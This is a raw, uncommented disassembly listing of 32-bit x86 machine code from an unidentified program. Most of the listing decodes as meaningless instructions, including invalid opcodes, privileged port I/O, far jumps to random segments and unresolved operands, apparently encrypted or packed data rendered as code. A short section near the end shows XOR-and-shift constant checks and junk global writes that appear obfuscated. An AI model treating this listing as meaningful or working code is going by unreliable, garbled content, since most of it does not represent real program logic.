  40a2cb:	push   cs
  40a2cc:	jae    0x40a29e
  40a2ce:	push   edx
  40a2cf:	mov    ebx,0xc0c064f7
  40a2d4:	adc    ebp,DWORD PTR [ecx+0x383e0c57]
  40a2da:	jle    0x40a277
  40a2dc:	out    0xa8,eax
  40a2de:	mov    ds:0xdff3f114,eax
  40a2e3:	shl    BYTE PTR [ebp-0x30],cl
  40a2e6:	dec    edi
  40a2e7:	les    ebx,FWORD PTR [esi]
  40a2e9:	pop    es
  40a2ea:	push   ebx
  40a2eb:	xchg   esi,eax
  40a2ec:	daa    
  40a2ed:	pop    ecx
  40a2ee:	gs shl esi,1
  40a2f1:	sub    dl,al
  40a2f3:	leave  
  40a2f4:	cmp    eax,0x7e7ba101
  40a2f9:	mov    ?,WORD PTR ds:0x559a5b03
  40a2ff:	repnz stc 
  40a301:	ds xchg esi,eax
  40a303:	mov    WORD PTR [ecx-0x56fc77b2],?
  40a309:	cmp    BYTE PTR [eax],bl
  40a30b:	sar    DWORD PTR [edx-0x75],1
  40a30e:	push   DWORD PTR [edx+edx*8-0x2c071026]
  40a315:	int    0x5c
  40a317:	(bad)  
  40a318:	sti    
  40a319:	out    dx,eax
  40a31a:	push   edi
  40a31b:	addr16 lock jb 0x40a317
  40a31f:	mov    ebp,0xdc35f642
  40a324:	mov    al,0xb9
  40a326:	sbb    al,0xfa
  40a328:	mov    esp,0x50486311
  40a32d:	dec    esp
  40a32e:	mov    ds:0xebc7cd51,al
  40a333:	sbb    eax,0x96d3b4cd
  40a338:	push   es
  40a339:	and    ebp,ebp
  40a33b:	jmp    0x9db0:0x76f7af21
  40a342:	icebp  
  40a343:	jbe    0x40a333
  40a345:	cli    
  40a346:	xchg   esi,eax
  40a347:	sub    eax,0x2cba3b2f
  40a34c:	outs   dx,DWORD PTR ds:[esi]
  40a34d:	pop    ecx
  40a34e:	adc    al,BYTE PTR [eax+0x1cb9f8be]
  40a354:	test   BYTE PTR [esi+0x53010e00],dh
  40a35a:	pop    ebp
  40a35b:	ss sbb eax,0xb09df99a
  40a361:	jae    0x40a35a
  40a363:	mov    dh,0x20
  40a365:	lods   eax,DWORD PTR ds:[esi]
  40a366:	adc    al,0x82
  40a368:	cmp    ebx,edx
  40a36a:	add    BYTE PTR [ecx+0x6f],ch
  40a36d:	js     0x40a356
  40a36f:	rcr    BYTE PTR [ebx],0x1c
  40a372:	xor    al,0x6
  40a374:	cmp    esp,esp
  40a376:	jb     0x40a351
  40a378:	dec    ebx
  40a379:	add    esi,edi
  40a37b:	mov    dl,0xcc
  40a37d:	test   DWORD PTR [edx+0x74],esp
  40a380:	pusha  
  40a381:	loopne 0x40a394
  40a383:	or     al,0x5
  40a385:	neg    DWORD PTR [eax+edx*4+0x2336fa63]
  40a38c:	inc    edi
  40a38d:	imul   ecx,DWORD PTR [edx-0x6e442fc0],0x4c
  40a394:	mov    bh,0x6f
  40a396:	jns    0x40a344
  40a398:	jge    0x40a391
  40a39a:	sbb    dh,BYTE PTR [ecx+0x6d]
  40a39d:	mov    ah,0xea
  40a39f:	push   0x62
  40a3a1:	sbb    esi,DWORD PTR [ecx+0x28]
  40a3a4:	mov    al,0xa1
  40a3a6:	pop    eax
  40a3a7:	adc    eax,DWORD PTR [ebx-0x36]
  40a3aa:	cli    
  40a3ab:	or     DWORD PTR [esi+0x77e656],edx
  40a3b1:	pop    ebx
  40a3b2:	jbe    0x40a42a
  40a3b4:	mov    ecx,0x8ff16f7
  40a3b9:	sbb    ecx,DWORD PTR [edi]
  40a3bb:	aas    
  40a3bc:	inc    eax
  40a3bd:	rol    dh,0xdc
  40a3c0:	(bad)  
  40a3c1:	jnp    0x40a3e1
  40a3c3:	mov    edi,0xdd82b542
  40a3c8:	pop    eax
  40a3c9:	ss mov bl,0xac
  40a3cd:	adc    DWORD PTR [ebx+0x4645866e],esi
  40a3d3:	sub    DWORD PTR [esi],esp
  40a3d5:	and    edx,DWORD PTR [ecx+0xb]
  40a3d8:	dec    edi
  40a3d9:	call   0x4a2d55ef
  40a3de:	adc    ch,BYTE PTR [eax-0xa]
  40a3e1:	or     bl,dh
  40a3e3:	jb     0x40a39d
  40a3e5:	mov    DWORD PTR [ecx-0x7b6b2d83],esp
  40a3eb:	lock sbb BYTE PTR [ecx],ah
  40a3ee:	sub    eax,0x6ee39400
  40a3f3:	popf   
  40a3f4:	xchg   ebx,eax
  40a3f5:	push   ebp
  40a3f6:	sbb    BYTE PTR [si-0x94c],dh
  40a3fb:	mov    al,ds:0x13ca3382
  40a400:	imul   ecx,DWORD PTR [esp+eiz*8+0x6cdc507f],0x4d79d4d6
  40a40b:	cmc    
  40a40c:	dec    esp
  40a40d:	dec    esi
  40a40e:	rcl    BYTE PTR [ecx+0x5856ca7b],1
  40a414:	xchg   DWORD PTR [edi],ecx
  40a416:	ror    DWORD PTR [edi+edx*8-0x20da56eb],cl
  40a41d:	int3   
  40a41e:	or     eax,0xc8232fb7
  40a423:	loopne 0x40a404
  40a425:	cmp    al,0x92
  40a427:	push   ss
  40a428:	jmp    0x40a490
  40a42a:	add    bh,BYTE PTR [ecx]
  40a42c:	out    0x81,al
  40a42e:	lods   al,BYTE PTR ds:[esi]
  40a42f:	mov    dh,0xe8
  40a431:	inc    ecx
  40a432:	mov    bh,0xf2
  40a434:	js     0x40a410
  40a436:	(bad)  
  40a437:	cmp    BYTE PTR [edi-0x4d],dh
  40a43a:	lahf   
  40a43b:	mov    esi,eax
  40a43d:	push   esi
  40a43e:	sub    dh,BYTE PTR [ecx-0x18]
  40a441:	push   ecx
  40a442:	adc    esi,DWORD PTR [edi+0xb968ef2]
  40a448:	call   0xa5bef67d
  40a44d:	mov    WORD PTR [eax],ds
  40a44f:	and    ch,al
  40a451:	xor    dh,dl
  40a453:	aad    0xb8
  40a455:	sbb    eax,0xc46b53d6
  40a45a:	imul   esp,DWORD PTR [ebx],0xffffffe1
  40a45d:	fild   QWORD PTR [eax-0x19]
  40a460:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40a462:	mov    eax,ds:0x56395123
  40a467:	sbb    eax,DWORD PTR ds:0x709201a5
  40a46d:	mov    eax,ds:0x16fb9116
  40a472:	cdq    
  40a473:	adc    DWORD PTR [esi+0x2a],0xffffff98
  40a477:	and    eax,0xa6d605bd
  40a47c:	sbb    BYTE PTR [ecx-0x4fb0f49b],ah
  40a482:	pop    ecx
  40a483:	clc    
  40a484:	sbb    bh,BYTE PTR [edx-0x20697592]
  40a48a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a48b:	inc    esp
  40a48c:	ins    BYTE PTR es:[edi],dx
  40a48d:	xchg   ebx,eax
  40a48e:	cli    
  40a48f:	xchg   edi,eax
  40a490:	ror    DWORD PTR [esi+ebx*4],0x94
  40a494:	jl     0x40a41a
  40a496:	dec    ebp
  40a497:	stos   BYTE PTR es:[edi],al
  40a498:	pop    ebp
  40a499:	test   BYTE PTR [ecx+0x588a43ac],ch
  40a49f:	lahf   
  40a4a0:	(bad)  
  40a4a1:	les    ecx,FWORD PTR ds:0x7145bbbc
  40a4a7:	xor    esi,DWORD PTR [ecx]
  40a4a9:	hlt    
  40a4aa:	jmp    0x125e:0x5da1406f
  40a4b1:	pop    edx
  40a4b2:	sbb    ch,BYTE PTR [edi+ecx*4-0xa04a170]
  40a4b9:	add    eax,0xdedb8e88
  40a4be:	mov    esp,0x628505d3
  40a4c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c4:	mov    ds,WORD PTR [eax]
  40a4c6:	std    
  40a4c7:	outs   dx,DWORD PTR ds:[esi]
  40a4c8:	push   ebx
  40a4c9:	shr    esp,0x11
  40a4cc:	in     eax,0x88
  40a4ce:	int3   
  40a4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4d0:	mov    ebx,0xe07bbc63
  40a4d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4d6:	sub    esi,DWORD PTR [esi-0x46]
  40a4d9:	inc    eax
  40a4da:	cmp    edi,edx
  40a4dc:	adc    DWORD PTR [esi-0x5e],esi
  40a4df:	pop    ss
  40a4e0:	cs jg  0x40a4d2
  40a4e3:	aaa    
  40a4e4:	test   eax,0x8a9690b5
  40a4e9:	iret   
  40a4ea:	cmp    cl,BYTE PTR [esp+ecx*4+0x4561f0d3]
  40a4f1:	retf   0x236f
  40a4f4:	and    eax,0xc726e8
  40a4f9:	add    BYTE PTR [ebx+0x44e8b06],cl
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a4be
  40a524:	jb     0x40a522
  40a526:	mov    esi,0x18182bd8
  40a52b:	sahf   
  40a52c:	adc    bl,BYTE PTR [eax]
  40a52e:	sbb    BYTE PTR [ecx+0x78],bh
  40a531:	lahf   
  40a532:	clc    
  40a533:	icebp  
  40a534:	add    cl,BYTE PTR [ebp+0x55]
  40a537:	js     0x40a4db
  40a539:	jecxz  0x40a574
  40a53b:	mov    BYTE PTR [ecx+0x70],bl
  40a53e:	fsin   
  40a540:	cmp    eax,0x9c17c29b
  40a545:	mov    ecx,0xdf61d1ed
  40a54a:	mov    edx,0x35ff4352
  40a54f:	add    eax,0xa2444075
  40a554:	cdq    
  40a555:	and    eax,0xa6e22591
  40a55a:	sbb    BYTE PTR [edx],cl
  40a55c:	neg    BYTE PTR [edx-0x7f54ac29]
  40a562:	mov    ch,0x20
  40a564:	or     edi,DWORD PTR [edi+0x2adbf52b]
  40a56a:	push   0xfab9c8fb
  40a56f:	les    edi,FWORD PTR [ebx+ebp*8]
  40a572:	inc    ebp
  40a573:	xchg   edx,eax
  40a574:	mov    dh,0x1c
  40a576:	pop    es
  40a577:	dec    esi
  40a578:	jmp    0x6cdf9c44
  40a57d:	cmp    eax,DWORD PTR [esp+eax*4-0x77]
  40a581:	sub    DWORD PTR [esi+0x1e],0x1e
  40a585:	cli    
  40a586:	jecxz  0x40a606
  40a588:	add    al,0xb2
  40a58a:	xor    al,0xa1
  40a58c:	or     DWORD PTR [ebp+0x19fca93f],edi
  40a592:	test   eax,0x5861685f
  40a597:	lea    ecx,[edx]
  40a599:	mov    ah,0x37
  40a59b:	rcr    DWORD PTR [eax+ecx*1+0x6],0x5a
  40a5a0:	add    al,0x2
  40a5a2:	(bad)  
  40a5a4:	test   al,0x65
  40a5a6:	cmc    
  40a5a7:	ret    0xb9fd
  40a5aa:	sbb    DWORD PTR [edi+0x5d],eax
  40a5ad:	xor    al,ch
  40a5af:	add    DWORD PTR [eax+0x38],esp
  40a5b2:	stos   BYTE PTR es:[edi],al
  40a5b3:	ficomp DWORD PTR [eax+0x7c]
  40a5b6:	mov    ecx,0x82ce4244
  40a5bb:	adc    eax,0x835fefc0
  40a5c0:	outs   dx,BYTE PTR ds:[esi]
  40a5c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5c2:	(bad)  
  40a5c3:	fs inc esi
  40a5c5:	mov    edi,DWORD PTR [ecx+0x3e]
  40a5c8:	mul    DWORD PTR [eax+0x23dc3cc0]
  40a5ce:	mov    cl,0x46
  40a5d0:	cwde   
  40a5d1:	inc    ecx
  40a5d2:	ret    0xd8a8
  40a5d5:	mov    edi,0xc9c83c42
  40a5da:	mov    al,ds:0xa1f302bf
  40a5df:	sub    BYTE PTR [eax-0x7d3ecf52],ch
  40a5e5:	mov    bl,0x8a
  40a5e7:	lods   eax,DWORD PTR ds:[esi]
  40a5e8:	or     edi,0xf2c85a1
  40a5ee:	(bad)  
  40a5f0:	cdq    
  40a5f1:	push   esi
  40a5f2:	out    0xc7,al
  40a5f4:	fistp  WORD PTR [eax-0x32]
  40a5f7:	sahf   
  40a5f8:	es scas al,BYTE PTR es:[edi]
  40a5fa:	fs aad 0xa3
  40a5fd:	xchg   esi,eax
  40a5fe:	aaa    
  40a5ff:	sti    
  40a600:	pop    es
  40a601:	mov    cl,0x92
  40a603:	xchg   ecx,eax
  40a604:	pop    esp
  40a605:	loope  0x40a5bb
  40a607:	call   0x9bb73433
  40a60c:	push   edx
  40a60d:	imul   ebx,DWORD PTR [esi],0xfffffffc
  40a610:	bound  ebp,QWORD PTR [esp+edi*4+0x16]
  40a614:	or     BYTE PTR [edi+0x678782a],0xa4
  40a61b:	xchg   ecx,eax
  40a61c:	jb     0x40a672
  40a61e:	xor    dh,BYTE PTR [edi+0x29]
  40a621:	jmp    0x843f:0x8d98e730
  40a628:	jle    0x40a659
  40a62a:	retf   0xee49
  40a62d:	sub    BYTE PTR [eax+0x3e47fbd3],bh
  40a633:	push   edx
  40a634:	mov    BYTE PTR [esi],bl
  40a636:	and    al,0x42
  40a638:	in     eax,dx
  40a639:	clc    
  40a63a:	sbb    eax,0x4cb1930
  40a63f:	mov    BYTE PTR [esi+0x62cb50f1],cl
  40a645:	stc    
  40a646:	mov    ebp,0xc80306ad
  40a64b:	scas   al,BYTE PTR es:[edi]
  40a64c:	mov    esp,DWORD PTR [edi-0x64cf347f]
  40a652:	arpl   WORD PTR [eax+0x18c00f24],sp
  40a658:	js     0x40a6b0
  40a65a:	mov    esi,0x962774f9
  40a65f:	mov    eax,ds:0xa60ed480
  40a664:	add    eax,0x2cc22247
  40a669:	cmp    edx,esi
  40a66b:	outs   dx,BYTE PTR ds:[esi]
  40a66c:	mov    cs,edi
  40a66e:	fxch   st(4)
  40a670:	mov    edx,0xb0fd4e5a
  40a675:	in     eax,dx
  40a676:	lods   al,BYTE PTR ds:[esi]
  40a677:	fdiv   QWORD PTR [ebp-0x6c3c73bb]
  40a67d:	fmul   QWORD PTR [ebx-0x1f]
  40a680:	mov    edx,0xf8cb97a4
  40a685:	mov    al,0x8f
  40a687:	ss pop ds
  40a689:	or     DWORD PTR [edi],edx
  40a68b:	leave  
  40a68c:	add    eax,edx
  40a68e:	into   
  40a68f:	cmp    al,0x15
  40a691:	ins    DWORD PTR es:[edi],dx
  40a692:	fist   DWORD PTR [ebx-0x1e1c0305]
  40a698:	aas    
  40a699:	pop    eax
  40a69a:	or     bh,BYTE PTR fs:[edx+0x4c5e3f39]
  40a6a1:	int3   
  40a6a2:	and    al,0xa0
  40a6a4:	ds add eax,0xc106e3b1
  40a6aa:	jnp    0x40a65d
  40a6ac:	test   DWORD PTR [esi-0x5a983ab1],eax
  40a6b2:	stc    
  40a6b3:	sub    DWORD PTR [ecx+0x25],eax
  40a6b6:	(bad)  
  40a6b7:	in     al,dx
  40a6b8:	mul    BYTE PTR [ecx]
  40a6ba:	push   es
  40a6bb:	fld    TBYTE PTR [esi-0x6a]
  40a6be:	adc    eax,0x9f102d27
  40a6c3:	mov    al,ds:0xbb168267
  40a6c8:	and    eax,0x5f0fed32
  40a6cd:	aad    0x8
  40a6cf:	fwait
  40a6d0:	sbb    BYTE PTR [ecx],al
  40a6d2:	xchg   si,ax
  40a6d4:	xor    dh,BYTE PTR [eax-0x28]
  40a6d7:	loop   0x40a737
  40a6d9:	pop    edx
  40a6da:	(bad)  
  40a6db:	push   edi
  40a6dc:	mov    edx,0x2f648c91
  40a6e1:	cmp    al,0x98
  40a6e3:	inc    edi
  40a6e4:	test   BYTE PTR [eax+0x3e],0x29
  40a6e8:	sub    eax,0x1d3cb58d
  40a6ed:	dec    edx
  40a6ee:	clc    
  40a6ef:	int3   
  40a6f0:	fwait
  40a6f1:	jmp    0x40a6e3
  40a6f3:	mov    bl,0xec
  40a6f5:	pop    ecx
  40a6f6:	loopne 0x40a6c4
  40a6f8:	dec    edi
  40a6f9:	cmp    ch,BYTE PTR [edx-0x71]
  40a6fc:	pop    eax
  40a6fd:	xchg   ecx,eax
  40a6fe:	jae    0x40a69a
  40a700:	xchg   ebx,eax
  40a701:	add    al,0x5
  40a703:	outs   dx,BYTE PTR ds:[esi]
  40a704:	push   cs
  40a705:	xchg   edi,eax
  40a706:	fisttp QWORD PTR [edi]
  40a708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a709:	mov    esi,0xa15c4ea1
  40a70e:	jl     0x40a71f
  40a710:	xchg   edx,ecx
  40a712:	and    eax,0xfd4b77b7
  40a717:	fcomp  QWORD PTR [edi-0x7]
  40a71a:	aas    
  40a71b:	out    dx,al
  40a71c:	cmp    esp,eax
  40a71e:	push   0xe
  40a720:	mov    ds:0x8671016c,al
  40a725:	mov    al,0x60
  40a727:	imul   ebx,DWORD PTR [ebx],0x73396081
  40a72d:	shr    BYTE PTR [ebp+0x19],cl
  40a730:	sub    al,0x35
  40a732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a733:	jle    0x40a70e
  40a735:	not    bh
  40a737:	cs les ecx,FWORD PTR ds:[eax]
  40a73b:	enter  0x16c5,0xd9
  40a73f:	scas   eax,DWORD PTR es:[edi]
  40a740:	dec    edi
  40a741:	scas   eax,DWORD PTR es:[edi]
  40a742:	jb     0x40a74e
  40a744:	jmp    0x40a750
  40a746:	scas   eax,DWORD PTR es:[edi]
  40a747:	test   eax,0x6910e0c
  40a74c:	daa    
  40a74d:	aas    
  40a74e:	mov    al,0xea
  40a750:	dec    ebp
  40a751:	cli    
  40a752:	or     eax,0x6a65c48
  40a757:	inc    edi
  40a758:	fs dec ebx
  40a75a:	das    
  40a75b:	mov    ds:0x8b3ed802,eax
  40a760:	push   ebx
  40a761:	cmc    
  40a762:	adc    esp,edx
  40a764:	das    
  40a765:	outs   dx,DWORD PTR ds:[esi]
  40a766:	loope  0x40a745
  40a768:	sub    dh,BYTE PTR gs:[ebp+edx*4+0x3fb50541]
  40a770:	cmp    dh,BYTE PTR [ebp+0x4]
  40a773:	ja     0x40a71e
  40a775:	cmc    
  40a776:	gs dec ebx
  40a778:	int3   
  40a779:	sbb    eax,0x40c67df0
  40a77e:	push   ss
  40a77f:	mov    esp,0x80cbe140
  40a784:	data16 mov al,0x62
  40a787:	inc    ecx
  40a788:	fild   DWORD PTR [ecx]
  40a78a:	in     al,dx
  40a78b:	pusha  
  40a78c:	xchg   edi,eax
  40a78d:	sbb    dl,cl
  40a78f:	sbb    DWORD PTR [eax-0x6c],eax
  40a792:	int    0x36
  40a794:	and    DWORD PTR [ecx-0x3a32151e],esi
  40a79a:	xchg   ebx,eax
  40a79b:	pop    ebp
  40a79c:	cdq    
  40a79d:	xchg   esp,eax
  40a79e:	push   ebp
  40a79f:	cmp    edx,DWORD PTR [edx]
  40a7a1:	or     al,0xa6
  40a7a3:	das    
  40a7a4:	inc    ebx
  40a7a5:	mov    ebp,0x7e507903
  40a7aa:	jmp    0xcdd829b3
  40a7af:	pop    edi
  40a7b0:	sub    esp,DWORD PTR [edx]
  40a7b2:	iret   
  40a7b3:	clc    
  40a7b4:	push   edx
  40a7b5:	cmp    eax,0xd62ca723
  40a7ba:	ss inc ecx
  40a7bc:	mov    al,ds:0x13df966f
  40a7c1:	push   ds
  40a7c2:	cmp    dl,BYTE PTR [esi]
  40a7c4:	loop   0x40a758
  40a7c6:	das    
  40a7c7:	shr    BYTE PTR [esp+esi*1-0x5d0b7501],1
  40a7ce:	pop    ds
  40a7cf:	test   ah,dh
  40a7d1:	sub    eax,0x72b9e6ca
  40a7d6:	push   ebp
  40a7d7:	xchg   ecx,eax
  40a7d8:	sbb    ebp,eax
  40a7da:	repnz loope 0x40a81c
  40a7dd:	sub    ebp,0xffffffd5
  40a7e0:	sub    cl,ch
  40a7e2:	cmp    eax,0xe65ce419
  40a7e7:	cs (bad) 
  40a7e9:	scas   eax,DWORD PTR es:[edi]
  40a7ea:	shl    BYTE PTR [ecx-0x52],0x70
  40a7ee:	int    0xa7
  40a7f0:	ins    BYTE PTR es:[edi],dx
  40a7f1:	mov    eax,0x309f6ede
  40a7f6:	hlt    
  40a7f7:	adc    dh,dl
  40a7f9:	pop    eax
  40a7fa:	imul   ebp,ebp,0xffffffea
  40a7fd:	or     eax,ebx
  40a7ff:	mov    WORD PTR [esi-0x188733ca],?
  40a805:	adc    ebp,ecx
  40a807:	mov    dl,0xc4
  40a809:	loopne 0x40a806
  40a80b:	dec    esp
  40a80c:	jmp    0x40a834
  40a80e:	jo     0x40a80a
  40a810:	(bad)  
  40a811:	loop   0x40a871
  40a813:	xor    cl,dh
  40a815:	mov    al,0x5
  40a817:	cli    
  40a818:	xor    eax,0xdfa4597c
  40a81d:	popf   
  40a81e:	xchg   esp,eax
  40a81f:	push   ds
  40a820:	xor    BYTE PTR [ecx+0x65],0xd3
  40a824:	xlat   BYTE PTR ds:[ebx]
  40a825:	jbe    0x40a88c
  40a827:	aad    0x5
  40a829:	rol    DWORD PTR [ecx+edx*8-0x20],1
  40a82d:	outs   dx,DWORD PTR ds:[esi]
  40a82e:	lea    edi,[edi]
  40a830:	lahf   
  40a831:	cmp    al,0xb7
  40a833:	fwait
  40a834:	add    al,0x96
  40a836:	jp     0x40a860
  40a838:	xchg   esi,eax
  40a839:	dec    ebp
  40a83a:	mov    eax,ds:0x48bb90b6
  40a83f:	push   ds
  40a840:	(bad)  
  40a841:	or     BYTE PTR [eax-0x468f1c3f],0xac
  40a848:	add    eax,0xbc292a5d
  40a84d:	repz mov esp,0xa9b49011
  40a853:	sub    ch,BYTE PTR [edi-0x11]
  40a856:	dec    ebx
  40a857:	les    ecx,FWORD PTR [ecx]
  40a859:	add    eax,0xff4159f
  40a85e:	ds mov ebx,0xe20db5a0
  40a864:	ins    BYTE PTR es:[edi],dx
  40a865:	inc    esi
  40a866:	clc    
  40a867:	or     DWORD PTR ds:0x6bd082c,ecx
  40a86d:	push   ds
  40a86e:	lea    edi,fs:[ecx]
  40a871:	daa    
  40a872:	imul   ecx,DWORD PTR ds:[edx+0xdcd47af],0x5866476d
  40a87d:	mov    ds:0x20aa8415,al
  40a882:	jbe    0x40a836
  40a884:	imul   BYTE PTR ds:0x8e156ea1
  40a88a:	pop    es
  40a88b:	dec    esi
  40a88c:	aas    
  40a88d:	dec    ebp
  40a88e:	cld    
  40a88f:	jae    0x40a857
  40a891:	je     0x40a8c5
  40a893:	fdivr  DWORD PTR [ebx+0x822898e]
  40a899:	jmp    FWORD PTR [edx-0x61]
  40a89c:	(bad)  
  40a89e:	jmp    0x40a89e
  40a8a0:	iret   
  40a8a1:	fst    DWORD PTR [ecx]
  40a8a3:	dec    edi
  40a8a4:	rcl    DWORD PTR [edi+0x6b],cl
  40a8a7:	jno    0x40a834
  40a8a9:	call   DWORD PTR ds:0x8ee0b4b
  40a8af:	sbb    al,0xd
  40a8b1:	lea    ecx,ds:0x627c704d
  40a8b7:	xor    DWORD PTR [esp+ebp*4+0x504cd47f],esp
  40a8be:	cs hlt 
  40a8c0:	add    cl,BYTE PTR [eax]
  40a8c2:	push   esp
  40a8c3:	test   al,0xd1
  40a8c5:	pop    es
  40a8c6:	daa    
  40a8c7:	retf   
  40a8c8:	repnz pop edx
  40a8ca:	(bad)  
  40a8cb:	pop    edi
  40a8cc:	retf   
  40a8cd:	and    BYTE PTR [ebp-0x266fab4a],bl
  40a8d3:	scas   al,BYTE PTR es:[edi]
  40a8d4:	sub    al,0x87
  40a8d6:	sbb    ch,BYTE PTR [edx+0x4]
  40a8d9:	sbb    eax,DWORD PTR [esi]
  40a8db:	(bad)  
  40a8dc:	out    dx,al
  40a8dd:	cli    
  40a8de:	dec    eax
  40a8df:	adc    al,0xbf
  40a8e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8e2:	xchg   esi,eax
  40a8e3:	xor    bh,BYTE PTR [ebp-0x5b]
  40a8e6:	rdpmc  
  40a8e8:	ret    0xace2
  40a8eb:	cmc    
  40a8ec:	loope  0x40a8b6
  40a8ee:	push   edx
  40a8ef:	ins    BYTE PTR es:[edi],dx
  40a8f0:	mov    DWORD PTR [ebp+0x10],edx
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x428353,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x428347,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x4282a3,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x42834b,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x4282d3
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x4282c7,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x428343
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42827b
  40aa46:	sbb    DWORD PTR ds:0x4281bb,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0xb87e1f6a
  40aa65:	clc    
  40aa66:	pop    ecx
  40aa67:	stos   BYTE PTR es:[edi],al
  40aa68:	pop    edi
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	inc    ecx
  40aa71:	pusha  
  40aa72:	or     eax,0x231a627
  40aa77:	push   esi
  40aa78:	out    0x55,eax
  40aa7a:	mov    eax,ds:0x428e40ba
  40aa7f:	(bad)  
  40aa80:	mov    BYTE PTR [ecx],dh
  40aa82:	sub    eax,0x4d8f5c41
  40aa87:	dec    eax
  40aa88:	xchg   esp,eax
  40aa89:	clc    
  40aa8a:	sahf   
  40aa8b:	and    edi,eax
  40aa8d:	xlat   BYTE PTR ds:[ebx]
  40aa8e:	hlt    
  40aa8f:	jl     0x40aa34
  40aa91:	or     DWORD PTR [ecx-0x39],ecx
  40aa94:	lea    esi,[edi]
  40aa96:	stos   DWORD PTR es:[edi],eax
  40aa97:	mov    eax,ds:0x66c5bba4
  40aa9c:	loopne 0x40aa7e
  40aa9e:	cmp    DWORD PTR [edi+ebx*1+0x2647840f],edi
  40aaa5:	das    
